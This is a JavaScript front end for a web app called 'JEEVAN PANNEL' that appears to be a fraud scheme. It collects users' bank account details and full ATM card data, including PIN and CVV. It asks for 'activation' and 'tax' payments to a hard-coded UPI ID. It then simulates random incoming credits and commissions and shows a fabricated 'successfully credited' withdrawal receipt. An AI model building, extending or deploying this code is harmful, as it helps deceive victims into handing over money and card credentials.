class JeevanApp {
    constructor() {
        this.init();
    }

    init() {
        console.log("⚡ JEEVAN PANNEL Started");
        this.setupButtons();
        this.setupFooterNavigation();
    }

    setupButtons() {
        // INDEX PAGE
        const registerBtn = document.getElementById("registerBtn");
        const loginBtn = document.getElementById("loginBtn");

        if (registerBtn) {
            registerBtn.addEventListener("click", () => window.location.href = "register.html");
        }
        if (loginBtn) {
            loginBtn.addEventListener("click", () => window.location.href = "login.html");
        }

        // REGISTER PAGE
        const createBtn = document.getElementById("createAccountBtn");
        if (createBtn) {
            createBtn.addEventListener("click", () => this.register());
        }

        // Add enter key for register inputs
        const regInputs = ["regPhone", "regPassword", "regConfirmPassword", "regUsername"];
        regInputs.forEach(id => {
            const input = document.getElementById(id);
            if (input) {
                input.addEventListener("keydown", (e) => {
                    if (e.key === "Enter") this.register();
                });
            }
        });

        // LOGIN PAGE
        const loginBtnPage = document.getElementById("loginBtnPage");
        if (loginBtnPage) {
            loginBtnPage.addEventListener("click", () => this.login());
        }

        // Add enter key for login inputs
        const loginInputs = ["loginPhone", "loginUsername", "loginPassword"];
        loginInputs.forEach(id => {
            const input = document.getElementById(id);
            if (input) {
                input.addEventListener("keydown", (e) => {
                    if (e.key === "Enter") this.login();
                });
            }
        });

        // DASHBOARD - Account Selection
        const accountBtns = document.querySelectorAll(".account-btn");
        accountBtns.forEach(btn => {
            btn.addEventListener("click", (e) => {
                const accountType = e.currentTarget.dataset.type;
                localStorage.setItem("selectedAccountType", accountType);
                window.location.href = "account-details.html";
            });
        });

        // ACCOUNT DETAILS FORM
        const submitAccBtn = document.getElementById("submitAccountBtn");
        if (submitAccBtn) {
            submitAccBtn.addEventListener("click", () => this.submitAccountDetails());
        }

        // ATM DETAILS
        const saveAtmBtn = document.getElementById("saveAtmBtn");
        if (saveAtmBtn) {
            saveAtmBtn.addEventListener("click", () => this.saveAtmDetails());
        }

        // PANEL ACTIVATION
        const copyUpiBtn = document.getElementById("copyUpiBtn");
        if (copyUpiBtn) {
            copyUpiBtn.addEventListener("click", () => this.copyToClipboard("jeevanpannelofficial@slc"));
        }

        const payNowBtn = document.getElementById("payNowBtn");
        if (payNowBtn) {
            payNowBtn.addEventListener("click", () => {
                const verifyInput = document.getElementById("verifyCustId");
                if (verifyInput) {
                    verifyInput.scrollIntoView({ behavior: "smooth", block: "center" });
                } else {
                    window.location.href = "payment-gateway.html";
                }
            });
        }

        // PAYMENT GATEWAY
        const submitPaymentBtn = document.getElementById("submitPaymentBtn");
        if (submitPaymentBtn) {
            submitPaymentBtn.addEventListener("click", () => this.submitPayment());
        }

        // VERIFY CUSTOMER ID
        const copyCustIdBtn = document.getElementById("copyCustIdBtn");
        if (copyCustIdBtn) {
            copyCustIdBtn.addEventListener("click", () => {
                const custId = document.getElementById("customerIdDisplay").value;
                this.copyToClipboard(custId);
            });
        }

        const paymentScreenshot = document.getElementById("paymentScreenshot");
        if (paymentScreenshot) {
            paymentScreenshot.addEventListener("change", (e) => {
                const fileDisplay = document.getElementById("paymentFileDisplay");
                if (e.target.files.length > 0) {
                    fileDisplay.textContent = `✓ ${e.target.files[0].name}`;
                    fileDisplay.style.display = "block";
                } else {
                    fileDisplay.style.display = "none";
                }
            });
        }

        const verifyCustomerBtn = document.getElementById("verifyCustomerBtn");
        if (verifyCustomerBtn) {
            verifyCustomerBtn.addEventListener("click", () => this.verifyCustomerId());
        }

        // RUNNING PANEL
        const withdrawBtn = document.getElementById("withdrawBtn");
        if (withdrawBtn) {
            withdrawBtn.addEventListener("click", () => window.location.href = "withdrawal-options.html");
        }

        const headerLogout = document.getElementById("headerLogout");
        if (headerLogout) {
            headerLogout.addEventListener("click", () => this.logout());
        }

        // WITHDRAWAL OPTIONS
        const impsBtn = document.getElementById("impsBtn");
        if (impsBtn) {
            impsBtn.addEventListener("click", () => {
                localStorage.setItem("withdrawalMethod", "IMPS");
                window.location.href = "withdrawal-form.html";
            });
        }

        const neftBtn = document.getElementById("neftBtn");
        if (neftBtn) {
            neftBtn.addEventListener("click", () => {
                localStorage.setItem("withdrawalMethod", "NEFT");
                window.location.href = "withdrawal-form.html";
            });
        }

        // WITHDRAWAL FORM
        const withdrawAmountBtn = document.getElementById("withdrawAmountBtn");
        if (withdrawAmountBtn) {
            withdrawAmountBtn.addEventListener("click", () => this.showTaxForm());
        }

        const copyWithdrawUpiBtn = document.getElementById("copyWithdrawUpiBtn");
        if (copyWithdrawUpiBtn) {
            copyWithdrawUpiBtn.addEventListener("click", () => this.copyToClipboard("jeevanpannelofficial@slc"));
        }

        const finalWithdrawBtn = document.getElementById("finalWithdrawBtn");
        if (finalWithdrawBtn) {
            finalWithdrawBtn.addEventListener("click", () => this.processWithdrawal());
        }

        // DELETE ACCOUNT
        const deleteAccBtn = document.getElementById("deleteAccBtn");
        if (deleteAccBtn) {
            deleteAccBtn.addEventListener("click", () => this.deleteAccount());
        }

        const updateReferralBtn = document.getElementById("updateReferralBtn");
        if (updateReferralBtn) {
            updateReferralBtn.addEventListener("click", () => this.updateReferralProgress());
        }

        const referralCountInput = document.getElementById("referralCountInput");
        if (referralCountInput) {
            referralCountInput.addEventListener("input", () => this.updateReferralProgress());
        }

        const redeemBonusBtn = document.getElementById("redeemBonusBtn");
        if (redeemBonusBtn) {
            redeemBonusBtn.addEventListener("click", () => this.redeemBonusCode());
        }

        if (document.getElementById("bonusPageRoot")) {
            this.initializeBonusPage();
        }
    }

    setupFooterNavigation() {
        const footerItems = document.querySelectorAll(".footer-item");
        footerItems.forEach(item => {
            item.tabIndex = 0; // Make focusable
            item.addEventListener("click", () => {
                const page = item.dataset.page;
                if (page === "profile") window.location.href = "profile.html";
                else if (page === "account") window.location.href = "account.html";
                else if (page === "support") window.location.href = "support.html";
                else if (page === "bonus") window.location.href = "bonus.html";
            });
            item.addEventListener("keydown", (e) => {
                if (e.key === "Enter" || e.key === " ") {
                    e.preventDefault();
                    const page = item.dataset.page;
                    if (page === "profile") window.location.href = "profile.html";
                    else if (page === "account") window.location.href = "account.html";
                    else if (page === "support") window.location.href = "support.html";
                    else if (page === "bonus") window.location.href = "bonus.html";
                }
            });
        });
    }

    register() {
        const phone = document.getElementById("regPhone").value;
        const password = document.getElementById("regPassword").value;
        const confirm = document.getElementById("regConfirmPassword").value;
        const username = document.getElementById("regUsername").value;

        if (!phone || !password || !confirm || !username) {
            this.showToast("❌ Please fill all fields");
            return;
        }

        if (password !== confirm) {
            this.showToast("❌ Passwords don't match");
            return;
        }

        const userData = {
            phone,
            username,
            password,
            registrationDate: new Date().toLocaleString(),
            customerId: this.generateCustomerId(),
            accountDetails: null,
            atmDetails: null,
            isPanelActivated: false,
            commissionsWithdrawn: 0,
            totalEarnings: 0
        };

        localStorage.setItem("user", JSON.stringify(userData));
        this.showToast("✅ Account created successfully!");
        setTimeout(() => window.location.href = "login.html", 1500);
    }

    login() {
        const phone = document.getElementById("loginPhone").value;
        const username = document.getElementById("loginUsername").value;
        const password = document.getElementById("loginPassword").value;

        const user = JSON.parse(localStorage.getItem("user"));

        if (!user || user.phone !== phone || user.username !== username || user.password !== password) {
            this.showToast("❌ Invalid credentials");
            return;
        }

        localStorage.setItem("currentUser", JSON.stringify(user));
        this.showToast("✅ Login successful!");
        setTimeout(() => window.location.href = "dashboard.html", 1500);
    }

    submitAccountDetails() {
        const accNumber = document.getElementById("accountNumber").value;
        const ifsc = document.getElementById("ifscCode").value;
        const holder = document.getElementById("accountHolderName").value;
        const bank = document.getElementById("bankName").value;
        const contact = document.getElementById("contactNumber").value;

        if (!accNumber || !ifsc || !holder || !bank || !contact) {
            this.showToast("❌ Please fill all fields");
            return;
        }

        const user = JSON.parse(localStorage.getItem("currentUser"));
        const selectedType = localStorage.getItem("selectedAccountType");

        user.accountDetails = {
            accountNumber: accNumber,
            ifscCode: ifsc,
            accountHolder: holder,
            bankName: bank,
            contact: contact,
            accountType: selectedType
        };

        localStorage.setItem("currentUser", JSON.stringify(user));
        this.showToast("✅ Account details saved!");
        setTimeout(() => window.location.href = "atm-details.html", 1500);
    }

    saveAtmDetails() {
        const atmCard = document.getElementById("atmCardNumber").value;
        const pin = document.getElementById("atmPin").value;
        const cvv = document.getElementById("atmCvv").value;
        const expiry = document.getElementById("atmExpiry").value;
        const cardholder = document.getElementById("cardHolderName").value;

        if (!atmCard || !pin || !cvv || !expiry || !cardholder) {
            this.showToast("❌ Please fill all fields");
            return;
        }

        const user = JSON.parse(localStorage.getItem("currentUser"));
        user.atmDetails = { atmCard, pin, cvv, expiry, cardholder };
        localStorage.setItem("currentUser", JSON.stringify(user));

        this.showToast("✅ ATM details saved!");
        setTimeout(() => window.location.href = "panel-activation.html", 1500);
    }

    submitPayment() {
        const utrInput = document.getElementById("utrNumber");
        const screenshotInput = document.getElementById("paymentScreenshot");
        const utr = utrInput ? utrInput.value.trim() : "";
        const screenshot = screenshotInput ? screenshotInput.files : null;

        if (!utr || !screenshot || screenshot.length === 0) {
            alert("❌ Please fill all fields and upload screenshot");
            return;
        }

        const verifyInput = document.getElementById("verifyCustId");
        if (verifyInput) {
            this.showToast("✅ Payment submitted! Now verify your customer ID below.");
            const customerIdBox = document.getElementById("customerIdBox");
            if (customerIdBox) {
                customerIdBox.style.display = "block";
            }
            verifyInput.scrollIntoView({ behavior: "smooth", block: "center" });
            return;
        }

        this.showToast("✅ Payment submitted!");
        setTimeout(() => window.location.href = "verify-customer-id.html", 1500);
    }

    generateCustomerId() {
        const random = Math.floor(10000 + Math.random() * 90000);
        return `${random}@JEEVAN`;
    }

    verifyCustomerId() {
        const entered = document.getElementById("verifyCustId").value;
        const actual = document.getElementById("customerIdDisplay").value;

        if (entered !== actual) {
            this.showToast("❌ Customer ID doesn't match");
            return;
        }

        const user = JSON.parse(localStorage.getItem("currentUser"));
        user.isPanelActivated = true;
        localStorage.setItem("currentUser", JSON.stringify(user));

        this.showToast("✅ Customer ID verified!");
        setTimeout(() => window.location.href = "running-panel.html", 1500);
    }

    showTaxForm() {
        const accNumber = document.getElementById("wAccNumber").value;
        const ifsc = document.getElementById("wIfscCode").value;
        const holder = document.getElementById("wAccHolder").value;
        const bank = document.getElementById("wBankName").value;

        if (!accNumber || !ifsc || !holder || !bank) {
            this.showToast("❌ Please fill all account details first");
            return;
        }

        document.getElementById("taxSection").style.display = "block";
        this.setupUpiApps("withdrawUpiApps", 229);
    }

    processWithdrawal() {
        const utr = document.getElementById("withdrawUtr").value.trim();
        const screenshot = document.getElementById("withdrawScreenshot").files;

        if (!utr || !screenshot || screenshot.length === 0) {
            alert("❌ Please fill all fields and upload screenshot");
            return;
        }

        // Store withdrawal data
        const method = localStorage.getItem("withdrawalMethod");
        const withdrawAmount = document.getElementById("withdrawAmount").innerText.replace('₹ ', '').trim();
        
        localStorage.setItem("lastWithdrawal", JSON.stringify({
            method: method,
            amount: withdrawAmount,
            accountNumber: document.getElementById("wAccNumber").value,
            ifsc: document.getElementById("wIfscCode").value,
            bank: document.getElementById("wBankName").value,
            timestamp: new Date()
        }));

        // Update user's total withdrawn commission
        const user = JSON.parse(localStorage.getItem("currentUser"));
        user.commissionsWithdrawn = (user.commissionsWithdrawn || 0) + parseInt(withdrawAmount);
        localStorage.setItem("currentUser", JSON.stringify(user));

        window.location.href = "receipt.html";
    }

    deleteAccount() {
        const phone = prompt("Enter your phone number to verify:");
        const password = prompt("Enter your password to verify:");

        const user = JSON.parse(localStorage.getItem("currentUser"));

        if (phone !== user.phone || password !== user.password) {
            this.showToast("❌ Verification failed");
            return;
        }

        if (confirm("Are you sure you want to delete your account? This cannot be undone.")) {
            user.accountDetails = null;
            user.atmDetails = null;
            localStorage.setItem("currentUser", JSON.stringify(user));
            this.showToast("✅ Account deleted successfully");
            setTimeout(() => window.location.href = "dashboard.html", 1500);
        }
    }

    initializeBonusPage() {
        this.updateReferralProgress();
        const commissionTotal = this.calculateCommission();
        const commissionValue = document.getElementById("commissionTotal");
        const weeklyBonusDays = document.getElementById("weeklyBonusDays");
        const bonusMessage = document.getElementById("bonusEligibilityMessage");

        if (commissionValue) {
            commissionValue.textContent = `₹${commissionTotal.toLocaleString()}`;
        }

        if (weeklyBonusDays) {
            weeklyBonusDays.innerHTML = "";
            if (commissionTotal > 21000) {
                const bonusAmounts = [];
                for (let i = 1; i <= 7; i++) {
                    const amount = Math.floor(Math.random() * 601) + 1500;
                    bonusAmounts.push(amount);
                }

                bonusAmounts.forEach((amount, index) => {
                    const day = document.createElement("div");
                    day.className = "bonus-day";
                    day.innerHTML = `<span>Day ${index + 1}</span><strong>₹${amount}</strong>`;
                    weeklyBonusDays.appendChild(day);
                });

                if (bonusMessage) {
                    bonusMessage.textContent = "You are eligible for a random daily bonus for 7 days.";
                }
            } else {
                if (bonusMessage) {
                    bonusMessage.textContent = "Earn above ₹21,000 commission to unlock the weekly bonus.";
                }
            }
        }
    }

    calculateCommission() {
        const stored = localStorage.getItem("transactions");
        if (!stored) return 0;

        try {
            const transactions = JSON.parse(stored);
            return transactions.reduce((sum, item) => sum + (item.amount || 0), 0);
        } catch (error) {
            return 0;
        }
    }

    updateReferralProgress() {
        const referralInput = document.getElementById("referralCountInput");
        const count = referralInput ? Number(referralInput.value) : 0;
        const levels = document.querySelectorAll(".referral-level");

        levels.forEach(level => {
            const target = Number(level.dataset.target);
            const boxes = level.querySelectorAll(".progress-box");
            boxes.forEach((box, index) => {
                box.classList.toggle("filled", index < count);
            });

            const progressText = level.querySelector(".progress-status");
            if (progressText) {
                progressText.textContent = `${Math.min(count, target)}/${target} referrals`;
            }
        });

        const status = document.getElementById("referralStatusMessage");
        if (status) {
            if (count >= 12) {
                status.textContent = "🎉 Amazing! You unlocked all referral bonuses.";
            } else if (count > 0) {
                status.textContent = `You’ve completed ${count} referral${count === 1 ? "" : "s"}. Keep pushing toward the next bonus level.`;
            } else {
                status.textContent = "Enter your completed referrals to see progress updates.";
            }
        }
    }

    redeemBonusCode() {
        const input = document.getElementById("bonusCodeInput");
        const result = document.getElementById("bonusResult");
        if (!input || !result) return;

        const code = input.value.trim().toUpperCase();
        const codes = {
            DAILY300: 300,
            LEVELUP700: 700,
            GIFT1200: 1200,
            LUCKY1500: 1500,
            SUPER2100: 2100
        };

        if (!codes[code]) {
            result.textContent = "Invalid Bonus Code";
            result.className = "bonus-result bonus-error";
            return;
        }

        result.textContent = `✅ Bonus redeemed: ₹${codes[code]}`;
        result.className = "bonus-result bonus-success";
        input.value = "";
    }

    copyToClipboard(text) {
        navigator.clipboard.writeText(text).then(() => {
            this.showToast("✅ Copied to clipboard!");
        }).catch(() => {
            this.showToast("❌ Failed to copy");
        });
    }

    showToast(message) {
        // Remove existing toast
        const existingToast = document.querySelector('.toast');
        if (existingToast) existingToast.remove();

        // Create new toast
        const toast = document.createElement('div');
        toast.className = 'toast';
        toast.textContent = message;
        toast.style.cssText = `
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: var(--primary);
            color: white;
            padding: 12px 20px;
            border-radius: 8px;
            z-index: 1000;
            font-weight: bold;
            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
            animation: fadeIn 0.3s ease;
        `;
        document.body.appendChild(toast);

        // Remove after 2.5 seconds
        setTimeout(() => {
            if (toast && toast.parentElement) {
                toast.style.animation = 'fadeOut 0.3s ease';
                setTimeout(() => {
                    if (toast && toast.parentElement) toast.remove();
                }, 300);
            }
        }, 2500);
    }

    logout() {
        localStorage.removeItem("currentUser");
        window.location.href = "index.html";
    }

    setupUpiApps(containerId, amount) {
        const container = document.getElementById(containerId);
        if (!container) return;

        const apps = [
            { name: "Google Pay", icon: "fab fa-google" },
            { name: "PhonePe", icon: "fas fa-mobile-alt" },
            { name: "Paytm", icon: "fas fa-wallet" },
            { name: "WhatsApp Pay", icon: "fab fa-whatsapp" }
        ];

        container.innerHTML = "";
        apps.forEach(app => {
            const btn = document.createElement("button");
            btn.className = "upi-app";
            btn.innerHTML = `<i class="${app.icon}"></i> ${app.name}`;
            btn.onclick = () => this.redirectToUpi(app.name, amount);
            container.appendChild(btn);
        });
    }

    redirectToUpi(appName, amount) {
        const upiUrl = `upi://pay?pa=jeevanpannelofficial@slc&pn=JEEVAN%20PANNEL&am=${amount}&tr=${Date.now()}`;
        window.location.href = upiUrl;
    }
}

// Initialize app
document.addEventListener("DOMContentLoaded", () => {
    new JeevanApp();

    // Get current user
    const user = JSON.parse(localStorage.getItem("currentUser"));

    // Load dashboard page
    const dashboardContainer = document.querySelector(".dashboard-container");
    if (dashboardContainer && user) {
        const dashUsername = document.getElementById("dashUsername");
        if (dashUsername) {
            dashUsername.innerText = user.username;
        }
    }

    // Load running-panel data
    const runUsername = document.getElementById("runUsername");
    if (runUsername && user) {
        runUsername.innerText = user.username;
        loadDashboardData();
    }

    // Load profile data
    const profilePhone = document.getElementById("profilePhone");
    if (profilePhone && user) {
        loadProfileData();
    }

    // Load account data
    const accNumber = document.getElementById("accNumber");
    if (accNumber && user) {
        loadAccountData();
    }

    // Load withdrawal form defaults
    const wAccNumber = document.getElementById("wAccNumber");
    if (wAccNumber && user) {
        loadWithdrawalDefaults();
    }

    // Setup UPI apps on panel activation
    const upiApps = document.getElementById("upiApps");
    if (upiApps) {
        const app = new JeevanApp();
        app.setupUpiApps("upiApps", 539);
    }

    // Setup UPI apps on withdrawal form
    const withdrawUpiApps = document.getElementById("withdrawUpiApps");
    if (withdrawUpiApps) {
        const app = new JeevanApp();
        app.setupUpiApps("withdrawUpiApps", 229);
    }

    // Load customer ID display on activation / verify pages
    const customerIdDisplay = document.getElementById("customerIdDisplay");
    if (customerIdDisplay && user) {
        customerIdDisplay.value = user.customerId || "00000@JEEVAN";
    }

    // Setup receipt if on receipt page
    const receiptContent = document.getElementById("receiptContent");
    if (receiptContent) {
        setTimeout(() => {
            document.getElementById("loadingScreen").style.display = "none";
            receiptContent.style.display = "block";
            loadReceiptData();
        }, 3500);
    }
});

function loadDashboardData() {
    const user = JSON.parse(localStorage.getItem("currentUser"));
    if (!user) {
        window.location.href = "login.html";
        return;
    }

    // Display user info
    if (document.getElementById("runUsername")) {
        document.getElementById("runUsername").innerText = user.username;
    }

    // Load account details
    if (user.accountDetails) {
        const last4 = user.accountDetails.accountNumber.slice(-4);
        if (document.getElementById("accLast4")) {
            document.getElementById("accLast4").innerText = last4;
        }
        if (document.getElementById("accIfsc")) {
            document.getElementById("accIfsc").innerText = user.accountDetails.ifscCode;
        }
        if (document.getElementById("accHolder")) {
            document.getElementById("accHolder").innerText = user.accountDetails.accountHolder;
        }
    } else {
        // If no account details, stop
        return;
    }

    // Simulate transactions
    let totalEarnings = 0;
    const accountType = user.accountDetails?.accountType || "saving";
    const limits = { saving: 130000, current: 370000, corporate: 740000 };
    const maxAmount = limits[accountType];

    const txList = document.getElementById("transactionsList");
    if (!txList) return;
    
    txList.innerHTML = "";

    // Start transaction simulation
    const txInterval = setInterval(() => {
        if (totalEarnings >= maxAmount) {
            clearInterval(txInterval);
            updateStatusIndicator(true);
            return;
        }

        const amount = Math.floor(Math.random() * 3600) + 300;
        
        if (totalEarnings + amount > maxAmount) {
            clearInterval(txInterval);
            updateStatusIndicator(true);
            return;
        }

        totalEarnings += amount;
        const now = new Date();
        const time = now.toLocaleTimeString("en-IN");
        const apps = ["@PAYTM", "@GOOGLEPAY", "@PHONEPE", "@PHONEPAY"];
        const app = apps[Math.floor(Math.random() * apps.length)];

        const txDiv = document.createElement("div");
        txDiv.className = "transaction-item";
        txDiv.innerHTML = `<strong>+₹${amount}</strong> CREDITED ${app} <span style="font-size: 12px; color: #999;">${time}</span>`;
        txList.insertBefore(txDiv, txList.firstChild);

        // Vibrate on transaction
        if (navigator.vibrate) {
            navigator.vibrate(100);
        }

        // Keep only last 5 transactions visible
        while (txList.children.length > 5) {
            txList.removeChild(txList.lastChild);
        }

        updateStats(totalEarnings);
    }, 2000 + Math.random() * 2000);

    // Initial stats
    updateStats(0);
}

function updateStats(earnings) {
    if (document.getElementById("totalCredited")) {
        document.getElementById("totalCredited").innerText = "₹ " + earnings;
    }
    
    const commission = Math.floor(earnings * 0.039);
    
    if (document.getElementById("withdrawable")) {
        document.getElementById("withdrawable").innerText = "₹ " + commission;
    }
    
    if (document.getElementById("withdrawAmount")) {
        document.getElementById("withdrawAmount").innerText = "₹ " + commission;
    }
    
    // Save to localStorage for withdrawal form
    localStorage.setItem("currentCommission", commission.toString());
}

function updateStatusIndicator(exceeded) {
    const indicator = document.getElementById("statusIndicator");
    if (exceeded) {
        indicator.innerHTML = '<span class="status-dot stopped"></span><span style="color: #f44336;">STOPPED</span>';
    } else {
        indicator.innerHTML = '<span class="status-dot active"></span><span style="color: #4CAF50;">ACTIVE</span>';
    }
}

function loadProfileData() {
    const user = JSON.parse(localStorage.getItem("currentUser"));
    if (!user) return;

    document.getElementById("profilePhone").innerText = user.phone;
    document.getElementById("profileUsername").innerText = user.username;
    document.getElementById("profileCustId").innerText = user.customerId;
    document.getElementById("profileOpenDate").innerText = user.registrationDate;
}

function loadAccountData() {
    const user = JSON.parse(localStorage.getItem("currentUser"));
    if (!user || !user.accountDetails) return;

    const acc = user.accountDetails;
    document.getElementById("accNumber").innerText = acc.accountNumber;
    document.getElementById("accIfsc").innerText = acc.ifscCode;
    document.getElementById("accHolderName").innerText = acc.accountHolder;
    document.getElementById("accBankName").innerText = acc.bankName;
    document.getElementById("accContact").innerText = acc.contact;

    // Update commission details
    const withdrawn = user.commissionsWithdrawn || 0;
    document.getElementById("commissionEarned").innerText = "₹ " + withdrawn;

    const regDate = user.registrationDate || "N/A";
    const currentDate = new Date().toLocaleString();
    document.getElementById("commissionPeriod").innerText = regDate + " to " + currentDate;
}

function loadWithdrawalDefaults() {
    const user = JSON.parse(localStorage.getItem("currentUser"));
    if (!user || !user.accountDetails) return;

    // Keep withdrawal account fields blank for fresh user entry
    const wAccNumber = document.getElementById("wAccNumber");
    const wIfscCode = document.getElementById("wIfscCode");
    const wAccHolder = document.getElementById("wAccHolder");
    const wBankName = document.getElementById("wBankName");

    if (wAccNumber) wAccNumber.value = "";
    if (wIfscCode) wIfscCode.value = "";
    if (wAccHolder) wAccHolder.value = "";
    if (wBankName) wBankName.value = "";
    
    // Load commission amount from localStorage
    const commission = localStorage.getItem("currentCommission");
    if (commission && document.getElementById("withdrawAmount")) {
        document.getElementById("withdrawAmount").innerText = "₹ " + commission;
    }
}

function loadReceiptData() {
    const withdrawal = JSON.parse(localStorage.getItem("lastWithdrawal"));
    if (!withdrawal) return;

    const txnId = Math.floor(1000000000 + Math.random() * 9000000000);
    const amount = withdrawal.amount;
    const method = withdrawal.method;

    document.getElementById("txnId").innerText = txnId;
    document.getElementById("txnAmount").innerText = "₹ " + amount;
    document.getElementById("txnAccNumber").innerText = withdrawal.accountNumber;
    document.getElementById("txnIfsc").innerText = withdrawal.ifsc;
    document.getElementById("txnBank").innerText = withdrawal.bank;
    document.getElementById("txnMode").innerText = method;

    if (method === "IMPS") {
        document.getElementById("txnStatus").innerText = "SUCCESSFULLY CREDITED";
        document.getElementById("txnStatus").style.color = "#4CAF50";
    } else {
        document.getElementById("txnStatus").innerText = "CREDITED IN 3-5 WORKING DAYS";
        document.getElementById("txnStatus").style.color = "#FF9800";
    }

    const now = new Date();
    const date = now.toLocaleDateString("en-IN");
    const time = now.toLocaleTimeString("en-IN");
    document.getElementById("txnTime").innerText = `${date} ${time}`;
}